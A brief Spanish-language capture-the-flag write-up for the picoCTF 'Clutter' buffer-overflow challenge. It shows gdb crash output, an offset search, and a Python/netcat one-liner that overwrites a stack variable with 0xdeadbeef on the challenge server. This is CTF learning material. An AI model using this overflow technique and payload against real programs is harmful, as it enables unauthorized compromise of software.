# Reto


## Descripcion
Clutter, clutter everywhere and not a byte to use.`nc mars.picoctf.net 31890`
## Pistas
analizamos el codigo y encontramos que el limite delimitado es 256 haci que hay que pasar una cantidad mayor a ese numero para romper el codigo
define SIZE 0x100  (hexadecimal)
usando gbd corremos el codigo pasando 300 caracteres y obtenemos lo siguiente

```bash
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004007c0 in main ()
RBP: 0x3425416525414925 ('%IA%eA%4')
RSP: 0x7fffffffde58 ("A%JA%fA%5A%KA%gA%6A%")
RIP: 0x4007c0 (<main+249>:      ret)
```

buscamos los offsets para ver en que poscicion ocurre el bloqueo
```bash
gdb-peda$ pattern offset $rbp
3757481366783084837 found at offset: 272

```

una vez sabido esto ejecutamos de manera normal para ver que direccion ocupamos sobrescribir
```bash
My room is so cluttered...
What do you see?
dasda
code == 0x0
code != 0xdeadbeef :(

```
creamos un comando que introdusca la direccion deseada "deadbef" y obtenemos la bandera
```bash
(python3 -c 'import sys; sys.stdout.write("A" * 264)'; echo -e '\xef\xbe\xad\xde') | nc mars.picoctf.net 31890
```


## Solucion

## Bandera
picoCTF{}
## Notas adicionales


## Referencias
